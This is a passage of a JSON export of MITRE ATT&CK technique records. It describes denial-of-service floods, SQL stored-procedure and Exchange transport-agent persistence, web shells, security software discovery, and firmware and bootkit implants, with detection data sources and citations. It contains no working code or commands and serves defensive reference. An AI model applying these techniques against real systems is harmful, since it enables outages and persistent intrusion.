    "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
    "platform": "linux|macos|windows",
    "tid": "T1499.001",
    "technique": "OS Exhaustion Flood",
    "tactic": "impact",
    "datasources": "netflow-enclave-netflow|network-device-logs|network-intrusion-detection-system|ssl-tls-inspection",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may target the operating system (OS) for a DoS attack, since the (OS) is responsible for managing the finite resources on a system. These attacks do not need to exhaust the actual resources on a system since they can simply exhaust the limits that an OS self-imposes to prevent the entire system from being overwhelmed by excessive demands on its capacity.<!-- raw HTML omitted --><!-- raw HTML omitted -->Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)<!-- raw HTML omitted --><!-- raw HTML omitted -->ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/469.html",
        "description": "none",
        "external_id": "CAPEC-469"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/482.html",
        "description": "none",
        "external_id": "CAPEC-482"
      },
      {
        "source_name": "Arbor AnnualDoSreport Jan 2018",
        "url": "https://pages.arbornetworks.com/rs/082-KNA-087/images/13th_Worldwide_Infrastructure_Security_Report.pdf",
        "description": "Philippe Alcoy, Steinthor Bjarnason, Paul Bowen, C.F. Chui, Kirill Kasavchnko, and Gary Sockrider of Netscout Arbor. (2018, January). Insight into the Global Threat Landscape - Netscout Arbor's 13th Annual Worldwide Infrastructure Security Report. Retrieved April 22, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Cloudflare SynFlood",
        "url": "https://www.cloudflare.com/learning/ddos/syn-flood-ddos-attack/",
        "description": "Cloudflare. (n.d.). What is a SYN flood attack?. Retrieved April 22, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Corero SYN-ACKflood",
        "url": "https://www.corero.com/resources/ddos-attack-types/syn-flood-ack.html",
        "description": "Corero. (n.d.). What is a SYN-ACK Flood Attack?. Retrieved April 22, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco DoSdetectNetflow",
        "url": "https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf",
        "description": "Cisco. (n.d.). Detecting and Analyzing Network Threats With NetFlow. Retrieved April 25, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--38eb0c22-6caf-46ce-8869-5964bd735858",
    "platform": "linux|macos|windows|aws|gcp|azure|office-365|azure-ad|saas",
    "tid": "T1499.002",
    "technique": "Service Exhaustion Flood",
    "tactic": "impact",
    "datasources": "netflow-enclave-netflow|network-device-logs|network-intrusion-detection-system|ssl-tls-inspection|web-application-firewall-logs|web-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may target the different network services provided by systems to conduct a DoS. Adversaries often target DNS and web services, however others have been targeted as well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.<!-- raw HTML omitted --><!-- raw HTML omitted -->One example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.(Citation: Cloudflare HTTPflood)<!-- raw HTML omitted --><!-- raw HTML omitted -->Another variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.(Citation: Arbor SSLDoS April 2012)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/488.html",
        "description": "none",
        "external_id": "CAPEC-488"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/489.html",
        "description": "none",
        "external_id": "CAPEC-489"
      },
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/528.html",
        "description": "none",
        "external_id": "CAPEC-528"
      },
      {
        "source_name": "Arbor AnnualDoSreport Jan 2018",
        "url": "https://pages.arbornetworks.com/rs/082-KNA-087/images/13th_Worldwide_Infrastructure_Security_Report.pdf",
        "description": "Philippe Alcoy, Steinthor Bjarnason, Paul Bowen, C.F. Chui, Kirill Kasavchnko, and Gary Sockrider of Netscout Arbor. (2018, January). Insight into the Global Threat Landscape - Netscout Arbor's 13th Annual Worldwide Infrastructure Security Report. Retrieved April 22, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Cloudflare HTTPflood",
        "url": "https://www.cloudflare.com/learning/ddos/http-flood-ddos-attack/",
        "description": "Cloudflare. (n.d.). What is an HTTP flood DDoS attack?. Retrieved April 22, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Arbor SSLDoS April 2012",
        "url": "https://www.netscout.com/blog/asert/ddos-attacks-ssl-something-old-something-new",
        "description": "ASERT Team, Netscout Arbor. (2012, April 24). DDoS Attacks on SSL: Something Old, Something New. Retrieved April 22, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco DoSdetectNetflow",
        "url": "https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf",
        "description": "Cisco. (n.d.). Detecting and Analyzing Network Threats With NetFlow. Retrieved April 25, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
    "platform": "linux|macos|windows|aws|gcp|azure|office-365|azure-ad|saas",
    "tid": "T1499.003",
    "technique": "Application Exhaustion Flood",
    "tactic": "impact",
    "datasources": "network-device-logs|network-intrusion-detection-system|ssl-tls-inspection|web-application-firewall-logs|web-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may target resource intensive features of web applications to cause a denial of service (DoS). Specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself. (Citation: Arbor AnnualDoSreport Jan 2018)</p>\n",
    "technique_references": [
      {
        "source_name": "Arbor AnnualDoSreport Jan 2018",
        "url": "https://pages.arbornetworks.com/rs/082-KNA-087/images/13th_Worldwide_Infrastructure_Security_Report.pdf",
        "description": "Philippe Alcoy, Steinthor Bjarnason, Paul Bowen, C.F. Chui, Kirill Kasavchnko, and Gary Sockrider of Netscout Arbor. (2018, January). Insight into the Global Threat Landscape - Netscout Arbor's 13th Annual Worldwide Infrastructure Security Report. Retrieved April 22, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Cisco DoSdetectNetflow",
        "url": "https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf",
        "description": "Cisco. (n.d.). Detecting and Analyzing Network Threats With NetFlow. Retrieved April 25, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
    "platform": "linux|macos|windows|aws|gcp|azure|office-365|azure-ad|saas",
    "tid": "T1499.004",
    "technique": "Application or System Exploitation",
    "tactic": "impact",
    "datasources": "network-device-logs|network-intrusion-detection-system|ssl-tls-inspection|web-application-firewall-logs|web-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent DoS condition.</p>\n",
    "technique_references": [
      {
        "source_name": "Sucuri BIND9 August 2015",
        "url": "https://blog.sucuri.net/2015/08/bind9-denial-of-service-exploit-in-the-wild.html",
        "description": "Cid, D.. (2015, August 2). BIND9 – Denial of Service Exploit in the Wild. Retrieved April 26, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--f9e9365a-9ca2-4d9c-8e7c-050d73d1101a",
    "platform": "windows|linux",
    "tid": "T1505.001",
    "technique": "SQL Stored Procedures",
    "tactic": "persistence",
    "datasources": "application-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation: Microsoft xp_cmdshell 2017) <!-- raw HTML omitted --><!-- raw HTML omitted -->Microsoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.(Citation: NetSPI SQL Server CLR)</p>\n",
    "technique_references": [
      {
        "source_name": "NetSPI Startup Stored Procedures",
        "url": "https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/",
        "description": "Sutherland, S. (2016, March 7). Maintaining Persistence via SQL Server – Part 1: Startup Stored Procedures. Retrieved July 8, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Kaspersky MSSQL Aug 2019",
        "url": "https://securelist.com/malicious-tasks-in-ms-sql-server/92167/",
        "description": "Plakhov, A., Sitchikhin, D. (2019, August 22). Agent 1433: remote attack on Microsoft SQL Server. Retrieved September 4, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft xp_cmdshell 2017",
        "url": "https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-2017",
        "description": "Microsoft. (2017, March 15). xp_cmdshell (Transact-SQL). Retrieved September 9, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft CLR Integration 2017",
        "url": "https://docs.microsoft.com/en-us/sql/relational-databases/clr-integration/common-language-runtime-integration-overview?view=sql-server-2017",
        "description": "Microsoft. (2017, June 19). Common Language Runtime Integration. Retrieved July 8, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "NetSPI SQL Server CLR",
        "url": "https://blog.netspi.com/attacking-sql-server-clr-assemblies/",
        "description": "Sutherland, S. (2017, July 13). Attacking SQL Server CLR Assemblies. Retrieved July 8, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--35187df2-31ed-43b6-a1f5-2f1d3d58d3f1",
    "platform": "linux|windows",
    "tid": "T1505.002",
    "technique": "Transport Agent",
    "tactic": "persistence",
    "datasources": "application-logs|file-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.(Citation: Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. <!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.(Citation: ESET LightNeuron May 2019) Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft TransportAgent Jun 2016",
        "url": "https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help",
        "description": "Microsoft. (2016, June 1). Transport agents. Retrieved June 24, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "ESET LightNeuron May 2019",
        "url": "https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf",
        "description": "Faou, M. (2019, May). Turla LightNeuron: One email away from remote code execution. Retrieved June 24, 2019.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--5d0d3609-d06d-49e1-b9c9-b544e0c618cb",
    "platform": "linux|windows|macos",
    "tid": "T1505.003",
    "technique": "Web Shell",
    "tactic": "persistence",
    "datasources": "authentication-logs|file-monitoring|netflow-enclave-netflow|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.<!-- raw HTML omitted --><!-- raw HTML omitted -->In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (ex: <a href=\"https://attack.mitre.org/software/S0020\">China Chopper</a> Web shell client).(Citation: Lee 2013)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/650.html",
        "description": "none",
        "external_id": "CAPEC-650"
      },
      {
        "source_name": "Lee 2013",
        "url": "https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-i.html",
        "description": "Lee, T., Hanzlik, D., Ahl, I. (2013, August 7). Breaking Down the China Chopper Web Shell - Part I. Retrieved March 27, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "US-CERT Alert TA15-314A Web Shells",
        "url": "https://www.us-cert.gov/ncas/alerts/TA15-314A",
        "description": "US-CERT. (2015, November 13). Compromised Web Servers and Web Shells - Threat Awareness and Guidance. Retrieved June 8, 2016.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--cba37adb-d6fb-4610-b069-dd04c0643384",
    "platform": "linux|macos|windows|aws|gcp|azure|office-365|azure-ad|saas",
    "tid": "T1518.001",
    "technique": "Security Software Discovery",
    "tactic": "discovery",
    "datasources": "aws-cloudtrail-logs|azure-activity-logs|file-monitoring|process-command-line-parameters|process-monitoring|stackdriver-logs",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as firewall rules and anti-virus. Adversaries may use the information from <a href=\"https://attack.mitre.org/techniques/T1518/001\">Security Software Discovery</a> during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.<!-- raw HTML omitted --><!-- raw HTML omitted -->Example commands that can be used to obtain security software information are <a href=\"https://attack.mitre.org/software/S0108\">netsh</a>, <!-- raw HTML omitted -->reg query<!-- raw HTML omitted --> with <a href=\"https://attack.mitre.org/software/S0075\">Reg</a>, <!-- raw HTML omitted -->dir<!-- raw HTML omitted --> with <a href=\"https://attack.mitre.org/software/S0106\">cmd</a>, and <a href=\"https://attack.mitre.org/software/S0057\">Tasklist</a>, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.<!-- raw HTML omitted --><!-- raw HTML omitted -->Adversaries may also utilize cloud APIs to discover the configurations of firewall rules within an environment.(Citation: Expel IO Evil in AWS)</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/581.html",
        "description": "none",
        "external_id": "CAPEC-581"
      },
      {
        "source_name": "Expel IO Evil in AWS",
        "url": "https://expel.io/blog/finding-evil-in-aws/",
        "description": "A. Randazzo, B. Manahan and S. Lipton. (2020, April 28). Finding Evil in AWS. Retrieved June 25, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada",
    "platform": "windows",
    "tid": "T1542.001",
    "technique": "System Firmware",
    "tactic": "persistence",
    "datasources": "api-monitoring|bios|efi",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. (Citation: Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: About UEFI)<!-- raw HTML omitted --><!-- raw HTML omitted -->System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/532.html",
        "description": "none",
        "external_id": "CAPEC-532"
      },
      {
        "source_name": "Wikipedia BIOS",
        "url": "https://en.wikipedia.org/wiki/BIOS",
        "description": "Wikipedia. (n.d.). BIOS. Retrieved January 5, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia UEFI",
        "url": "https://en.wikipedia.org/wiki/Unified_Extensible_Firmware_Interface",
        "description": "Wikipedia. (2017, July 10). Unified Extensible Firmware Interface. Retrieved July 11, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "About UEFI",
        "url": "http://www.uefi.org/about",
        "description": "UEFI Forum. (n.d.). About UEFI Forum. Retrieved January 5, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "MITRE Trustworthy Firmware Measurement",
        "url": "http://www.mitre.org/publications/project-stories/going-deep-into-the-bios-with-mitre-firmware-security-research",
        "description": "Upham, K. (2014, March). Going Deep into the BIOS with MITRE Firmware Security Research. Retrieved January 5, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "MITRE Copernicus",
        "url": "http://www.mitre.org/capabilities/cybersecurity/overview/cybersecurity-blog/copernicus-question-your-assumptions-about",
        "description": "Butterworth, J. (2013, July 30). Copernicus: Question Your Assumptions about BIOS Security. Retrieved December 11, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "McAfee CHIPSEC Blog",
        "url": "https://securingtomorrow.mcafee.com/business/chipsec-support-vault-7-disclosure-scanning/",
        "description": "Beek, C., Samani, R. (2017, March 8). CHIPSEC Support Against Vault 7 Disclosure Scanning. Retrieved March 13, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Github CHIPSEC",
        "url": "https://github.com/chipsec/chipsec",
        "description": "Intel. (2017, March 18). CHIPSEC Platform Security Assessment Framework. Retrieved March 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Intel HackingTeam UEFI Rootkit",
        "url": "http://www.intelsecurity.com/advanced-threat-research/content/data/HT-UEFI-rootkit.html",
        "description": "Intel Security. (2005, July 16). HackingTeam's UEFI Rootkit Details. Retrieved March 20, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--16ab6452-c3c1-497c-a47d-206018ca1ada",
    "platform": "windows",
    "tid": "T1542.001",
    "technique": "System Firmware",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|bios|efi",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer. (Citation: Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: About UEFI)<!-- raw HTML omitted --><!-- raw HTML omitted -->System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/532.html",
        "description": "none",
        "external_id": "CAPEC-532"
      },
      {
        "source_name": "Wikipedia BIOS",
        "url": "https://en.wikipedia.org/wiki/BIOS",
        "description": "Wikipedia. (n.d.). BIOS. Retrieved January 5, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia UEFI",
        "url": "https://en.wikipedia.org/wiki/Unified_Extensible_Firmware_Interface",
        "description": "Wikipedia. (2017, July 10). Unified Extensible Firmware Interface. Retrieved July 11, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "About UEFI",
        "url": "http://www.uefi.org/about",
        "description": "UEFI Forum. (n.d.). About UEFI Forum. Retrieved January 5, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "MITRE Trustworthy Firmware Measurement",
        "url": "http://www.mitre.org/publications/project-stories/going-deep-into-the-bios-with-mitre-firmware-security-research",
        "description": "Upham, K. (2014, March). Going Deep into the BIOS with MITRE Firmware Security Research. Retrieved January 5, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "MITRE Copernicus",
        "url": "http://www.mitre.org/capabilities/cybersecurity/overview/cybersecurity-blog/copernicus-question-your-assumptions-about",
        "description": "Butterworth, J. (2013, July 30). Copernicus: Question Your Assumptions about BIOS Security. Retrieved December 11, 2015.",
        "external_id": "none"
      },
      {
        "source_name": "McAfee CHIPSEC Blog",
        "url": "https://securingtomorrow.mcafee.com/business/chipsec-support-vault-7-disclosure-scanning/",
        "description": "Beek, C., Samani, R. (2017, March 8). CHIPSEC Support Against Vault 7 Disclosure Scanning. Retrieved March 13, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Github CHIPSEC",
        "url": "https://github.com/chipsec/chipsec",
        "description": "Intel. (2017, March 18). CHIPSEC Platform Security Assessment Framework. Retrieved March 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Intel HackingTeam UEFI Rootkit",
        "url": "http://www.intelsecurity.com/advanced-threat-research/content/data/HT-UEFI-rootkit.html",
        "description": "Intel Security. (2005, July 16). HackingTeam's UEFI Rootkit Details. Retrieved March 20, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--791481f8-e96a-41be-b089-a088763083d4",
    "platform": "windows",
    "tid": "T1542.002",
    "technique": "Component Firmware",
    "tactic": "persistence",
    "datasources": "api-monitoring|component-firmware|disk-forensics|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to <a href=\"https://attack.mitre.org/techniques/T1542/001\">System Firmware</a> but conducted upon other system components/devices that may not have the same capability or level of integrity checking.<!-- raw HTML omitted --><!-- raw HTML omitted -->Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.</p>\n",
    "technique_references": [
      {
        "source_name": "SanDisk SMART",
        "url": "none",
        "description": "SanDisk. (n.d.). Self-Monitoring, Analysis and Reporting Technology (S.M.A.R.T.). Retrieved October 2, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "SmartMontools",
        "url": "https://www.smartmontools.org/",
        "description": "smartmontools. (n.d.). smartmontools. Retrieved October 2, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "ITWorld Hard Disk Health Dec 2014",
        "url": "https://www.itworld.com/article/2853992/3-tools-to-check-your-hard-drives-health-and-make-sure-its-not-already-dying-on-you.html",
        "description": "Pinola, M. (2014, December 14). 3 tools to check your hard drive's health and make sure it's not already dying on you. Retrieved October 2, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--791481f8-e96a-41be-b089-a088763083d4",
    "platform": "windows",
    "tid": "T1542.002",
    "technique": "Component Firmware",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|component-firmware|disk-forensics|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to <a href=\"https://attack.mitre.org/techniques/T1542/001\">System Firmware</a> but conducted upon other system components/devices that may not have the same capability or level of integrity checking.<!-- raw HTML omitted --><!-- raw HTML omitted -->Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.</p>\n",
    "technique_references": [
      {
        "source_name": "SanDisk SMART",
        "url": "none",
        "description": "SanDisk. (n.d.). Self-Monitoring, Analysis and Reporting Technology (S.M.A.R.T.). Retrieved October 2, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "SmartMontools",
        "url": "https://www.smartmontools.org/",
        "description": "smartmontools. (n.d.). smartmontools. Retrieved October 2, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "ITWorld Hard Disk Health Dec 2014",
        "url": "https://www.itworld.com/article/2853992/3-tools-to-check-your-hard-drives-health-and-make-sure-its-not-already-dying-on-you.html",
        "description": "Pinola, M. (2014, December 14). 3 tools to check your hard drive's health and make sure it's not already dying on you. Retrieved October 2, 2018.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--1b7b1806-7746-41a1-a35d-e48dae25ddba",
    "platform": "linux|windows",
    "tid": "T1542.003",
    "technique": "Bootkit",
    "tactic": "persistence",
    "datasources": "api-monitoring|mbr|vbr",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may use bootkits to persist on systems. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.<!-- raw HTML omitted --><!-- raw HTML omitted -->A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)<!-- raw HTML omitted --><!-- raw HTML omitted -->The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.</p>\n",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/552.html",
        "description": "none",
        "external_id": "CAPEC-552"
      },
      {
        "source_name": "Mandiant M Trends 2016",
